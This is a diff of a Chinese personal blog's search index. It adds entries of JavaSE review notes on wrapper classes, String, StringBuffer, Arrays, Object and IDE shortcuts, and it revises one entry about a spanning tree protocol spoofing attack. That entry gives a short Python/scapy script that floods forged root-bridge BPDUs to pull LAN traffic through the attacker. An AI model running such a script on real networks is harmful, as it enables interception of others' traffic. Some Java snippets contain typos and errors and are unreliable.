@@ -1,16 +1,145 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[网络攻防之——Python实现生成树协议(STP)欺骗攻击]]></title>
-    <url>%2F2019%2F04%2F09%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%2F</url>
-    <content type="text"><![CDATA[何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来位置下游设备之间的关系 根桥其实 代码示例 1234567891011#!/usr/bin/pythonfrom scapy.all import *eth = Dot3(dst="01:80:c2:00:00:00", src="00:0c:29:02:03:48")llc = LLC(dsap=0x42,ssap=0x42,ctrl=0x03)stp = STP(rootid=0, rootmac="00:0c:29:02:03:48", bridgeid=0, bridgemac="00:0c:29:02:03:48")pkt=sendp(eth/llc/stp,inter=2,loop=1)]]></content>
+    <title><![CDATA[javaSE复习之——Integer中的常见面试题]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.heima.wrapclass;public class Demo5_Integer &#123; /** * @param args */ public static void main(String[] args) &#123; Integer i1 = new Integer(97); Integer i2 = new Integer(97); System.out.println(i1 == i2); //false System.out.println(i1.equals(i2)); //true System.out.println("-----------"); Integer i3 = new Integer(197); Integer i4 = new Integer(197); System.out.println(i3 == i4); //false System.out.println(i3.equals(i4)); //true System.out.println("-----------"); Integer i5 = 127; Integer i6 = 127; System.out.println(i5 == i6); //true System.out.println(i5.equals(i6)); //true System.out.println("-----------"); Integer i7 = 128; Integer i8 = 128; System.out.println(i7 == i8); System.out.println(i7.equals(i8)); //true /* * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取 * 如果超过了byte取值范围就会再新创建对象 * * public static Integer valueOf(int i) &#123; assert IntegerCache.high &gt;= 127; //i&gt;= -128 &amp;&amp; i &lt;= 127 if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; */ &#125;&#125; 总结 底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个数组中取值，进而引用地址是一样的，所以上面返回了true]]></content>
       <categories>
         <category>JavaSE 复习</category>
       </categories>
       <tags>
+        <tag>Integer</tag>
+        <tag>Integer面试题</tag>
+        <tag>面试题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——JDK5新特性之_自动拆箱与装箱]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1%2F</url>
+    <content type="text"><![CDATA[代码详解123456789101112int x = 123;Integer i1 = new Integer(x);//手动装箱int y = i1.intValue();//手动拆箱Ineger x = 123;//自动装箱，他的底层是手动装箱int a = x + 100;//自动拆箱，他的底层是自动拆箱]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>新特性</tag>
+        <tag>JDK5</tag>
+        <tag>自动拆箱</tag>
+        <tag>自动装箱</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——String转换为其他数据类型]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
+    <content type="text"><![CDATA[代码： .parseXXX(“”); 特点： 基本数据类型包装类有八种，其中除了char其他都有.parseXXX()方法，因为char只能存入一个字符。 代码示例： 12String s1 = "123";int i = Integer.parseInt(s1);]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>String</tag>
+        <tag>String转换为其他数据类型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——String与int的相互转换]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%2F</url>
+    <content type="text"><![CDATA[String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。 int转String 1、123String s1 = "123";Integer i = new Integer(s1);int a = i.intValue(); 2、1String s1 = Integer.parseInt(123); ps:推荐用第二种]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>String与int的相互转换</tag>
+        <tag>String转int</tag>
+        <tag>int转String</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——基本数据类型包装类]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB%2F</url>
+    <content type="text"><![CDATA[基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多 基本数据类型 包装类 int Integer char Character Integer的特点： 1、能在int和String类型之间相互转换 2、提供了处理int类型时，非常有用的其他一些常量和方法。 3、能在创建对象时传入String类型的数据，但只限于int值。]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>基本数据类型包装类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——Arrays类]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB%2F</url>
+    <content type="text"><![CDATA[Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作 Arrats的方法： .toString() 数组转换为字符串 .sort() 数组排序 .binarySearch() 二分查找，返回索引值，如果没找到就返回，被查找数据在数组中应该出现的插入点的负数 减去1 前提：这个数组是一个序列数组 .asList() 把数组转换成集合，用List引用。例子： 1List&lt;String&gt; l = Arrays.asList(数组); 数组转集合的意义： 虽然从数组转换成的集合不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>Arrays类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——StringBuffer类]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB%2F</url>
+    <content type="text"><![CDATA[StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。 StringBuffer与String的区别 1、String赋的值它是不能被改变的，只能丢弃重新创建，如果字符拼接过多会产生过多的垃圾。 2、StringBuffer赋的值是可以被改变的，类似字符拼接建议用这个类，因为不会产生过多的垃圾。 2、虽然它们都是引用数据类型，但是String做参数传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。 StringBuffer的方法 属性获取： .capacity()返回当前容量 .length()返回实际长度 数据添加： .append()把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。 .insert(索引,字符串)在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。 数据删除： .deleteCharAt()删除任意索引的数据，返回本身。 .delete(索引1,索引2)删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾） 数据替换反转： .reverse()字符反转 .replace(开始索引，结束索引，要替换的数据)&gt;字符替换 数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String） .subString(索引)从索引开始，截取到字符串末尾。 .subString(开始,结尾)从开始位置截取字符串到结尾位置，不包括结尾索引。 StringBuffer的构造方法特点 1、无参构造默认容量为 16个字符 2、传入整数，比如传入10，那么这个容器的容量就为10个字符 3、传入一个字符串，比如传入：啊啊，那么实际长度为4，字符串缓冲区容量为20 4、如果内部缓冲区溢出，那么容量自动增大。 5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。 StringBuffer注意事项 1、不要利用重新创建另一个对象来试图清空容器，这只是引用了另一个容器对象而已，之前的那个容器并没有被清空，可以利用delete方法清空容器。 2、因为String与任意字符串相加的底层实现就是使用容器，并且String的值是不能修改的，它只能把之前的数据做垃圾处理重新创建一个数据，这样会不断的产生垃圾，所以在类似 字符串数组 转换成 字符串 或者 字符串拼接（String s = s1 + s2；） 的例程中使用容器最好。 StringBuffer与String的互转： StringBuffer转String 1、创建一个String对象，把容器传进去。 2、使用toString()方法。 3、使用subString()方法。 String转StringBuffer 1、创建一个StringBuffer对象，传入字符串即可。 2、通过append()方法把字符串加入到容器内。]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>StringBuffer类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——String类]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB%2F</url>
+    <content type="text"><![CDATA[String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型. String类特点： 1、String实际上是一个类，它重写了toString方法，所以创建String引用后直接输出调用该引用的名称就可以输出字符串数据。 2、String属于引用数据类型，而不是基本数据类型，基本数据类型为：int、char。。。，所以String数据对比需要用到equals方法，否则会出现判断不准确的问题 3、String没有set和get方法，所以它不存在修改数据，只能是替换数据，把之前的数据当作垃圾。 4、String s = “abc” 与 String a = “abc” 它们两个变量其实是记录了常量池中的地址值，而常量池有个特性，就是已有的数据它不会再去创建，所以 s==a为ture 5、String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot; 同等于String a = &quot;abc&quot; 因为java有常量优化机制，java编译时已经确定s = abc，所以s拿到的是常量abc的地址。 6、 1234String b = "ab"String c = "abc"c == a + "c"//结果为false 解析：因为任何数据与字符串用 + 连接，会在堆内存中创建StringBuider 或 StringBuffer缓冲区对象并使用append方法把数据相连，这里会得出：&quot;abc&quot;然后再使用toString方法创建一个“abc”的String对象返回这个”abc”被保存在堆内存中，而不是保存在常量池，所以变量c的值是常量池中的地址，而a + “c”是堆内存中的地址，所以用“==”号做比较返回false 7、String赋的值是不可以被改变的，只有把之前的值丢弃变成垃圾后，再赋新的值。 8、String虽然是引用数据类型，但是它当作参数传递的时候，它是和基本数据类型一样的。 获取键盘输入String需要注意的 System.in 它是标准的输入流，对应着键盘录入 sc.hasNextxxx（） 它判断输入的数是不是xxx数据类型，xxx可以是int、double等 sc.nextxxx（） 它获取已经输入的项，xxx和上面的xxx相同 sc.nextLine() 它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。 例：nextInt() 之后又用 nexiLine() 获取的是整数，而实际是全部内容为 数值/r/n 此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。 解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。 String的构造方法12String str = new String(Byte[] b);//有参构造 可以按照平台的默认字符集（也就是码表，GBK等等）解码byte数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。 12String str = new String(Byte[] b,2,4);//表示从b数组中的第二个索引开始解码，总共解码4个数据 String类的判断功能 .equals() 比较字符串内容序列是否相同，区分大小写 .equalsIgnoreCase() 与上面不同的是：不区分大小写 .contains() 判断字符串中是否包含传入的字符串 .startsWith() 判断字符串是否以传入字符串开头 .endswith() 判断字符串是否以传入字符串结尾 .isEmpty() 判断字符串是否为空 Null与””的区别 “”是字符串常量，也是String类的对象，所以可以调用String类的方法 Null是空常量，不能调用任何方法，否则会出现空指针异常，Null可以给任意引用数据类型赋值。 注意事项： 1、以后比较字符串时最好都用equals，因为equals比较的是内容，而==号比较的时后，有时比较的是地址值 2、使用equals时，有常量就用常量对象的equals方法，尽量不用变量对象的equals方法，因为变量对象的值有可能时null，调用equals方法会出现空指针异常 String类的获取功能 .length() 获取字符串长度(字符个数) 例子：&quot;我&quot;.length() 为1 ps：数组中的length是属性，而String中的是对象方法 .charAt() 获取指定索引的字符 .indexOf() 返回字符 或 字符串在此字符串中第一次出现的索引 如果不存在返回-1 如果查找的是字符串，返回索引就是查找字符串第一个字符的索引 .indexOf(,) 与上面不同的是在某个位置之后查找 .lastIndexOf() 从后向前找 .substring() 从指定位置开始截取字符串，默认到末尾 .substring(,) 与上不同的是自己指定了截取字符串的尾部位置并且，包含头不包含尾部 注意：截取字符串之后需要用一个变量来保存，因为substring是不会改变原来的值的。 GBK码表的特性 1、中文是两个字节组成 2、中文字节的第一个字节一定是负数 String类的类型转换功能 .getBytes() 把字符串转换成字节数组，这是一个编码的过程：把我们看的懂的编码成计算机看得懂的 .toCharArray() 转换成字符数组 String.valueOf（） 把字符数组转换为字符串，传入一个字符数组，返回一个字符串 注意： 1、传入的数组类型可以是任意类型，并且底层还是由String的构造方法来解码的。 2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法 .toLowerCase() 把字符串转换为小写 .toUpperase() 把字符串转换为大写 ps：String中字符的转换都是按照unicode码表来转换的 String的其他功能 .repleace(被替换的字符串，要替换成的字符串) 字符或字符串替换，不存在则不改变 .trim() 去除首尾空格 .compareTo() 按照字典顺序比较两个字符串]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>String类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——Object类]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB%2F</url>
+    <content type="text"><![CDATA[Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。 重写toString代码示例：123public Stirng toString() &#123; return name + "," + age;&#125; equals方法 equals方法默认是比较地址值，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象没有重写equals，那么调用它是无意义的。 重写equals代码演示：12345//重写equals方法public boolean equals(Object obj) &#123; Student s = (Student)obj; return this.name.equals(s.name) &amp;&amp;this.age == s.age; //这里的equals调用的是string里的方法&#125; ==号和equsls的区别（面试可能问道）： 1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是 数据值，比较引用数据类型比较的是地址的值 2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没 有意义，但是我们可以重写它使其有意义。]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>Object类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——Idea常用快捷键]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
+    <content type="text"><![CDATA[暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示 ctrl+Y 删除光标所在行 ctrl+D 复制光标所在行，并且粘贴在它的下面 ctrl+alt+L 格式化代码 ctrl+/ 单行注释 Ctrl+shift+/ 选中行注释，多行注释 alt+ins 自动生成代码，get、set等 alt+shift+上下箭 移动当前代码行]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>idea快捷键</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[javaSE复习之——Eclipse常用快捷键]]></title>
+    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
+    <content type="text"><![CDATA[常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建ctrl + shift + f 格式化代码，使代码更简洁 ctrl + / 注释 也可以ctrl + shift + /或\ F3或ctrl + 鼠标点击 查看源码 ctrl + 1 给建议 alt + shift + m 抽取一段代码成方法，省去了复制 alt + shift + r 改名，在改变量是非常好用 shift + alt + s 生成toString Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定) Ctrl+D: 删除当前行 Ctrl+Alt+↓ 复制当前行到下一行(复制增加) Ctrl+Alt+↑ 复制当前行到上一行(复制增加) Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) Alt+↑ 当前行和上面一行交互位置(同上)]]></content>
+      <categories>
+        <category>JavaSE 复习</category>
+      </categories>
+      <tags>
+        <tag>Eclipse快捷键</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[网络攻防之——Python实现生成树协议(STP)欺骗攻击]]></title>
+    <url>%2F2019%2F04%2F09%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例 12345678910111213#!/usr/bin/pythonfrom scapy.all import *//01:80:c2:00:00:00这个是一个组播地址eth = Dot3(dst="01:80:c2:00:00:00", src="自己的MAC地址")llc = LLC()stp = STP(rootid=0, rootmac="自己的MAC地址", bridgeid=0, bridgemac="自己的MAC地址")pkt=sendp(eth/llc/stp,inter=2,loop=1)]]></content>
+      <categories>
+        <category>网络攻防</category>
+      </categories>
+      <tags>
         <tag>Python</tag>
-        <tag>生成树协议欺骗</tag>
         <tag>网络攻防</tag>
+        <tag>生成树协议欺骗</tag>
       </tags>
   </entry>
   <entry>
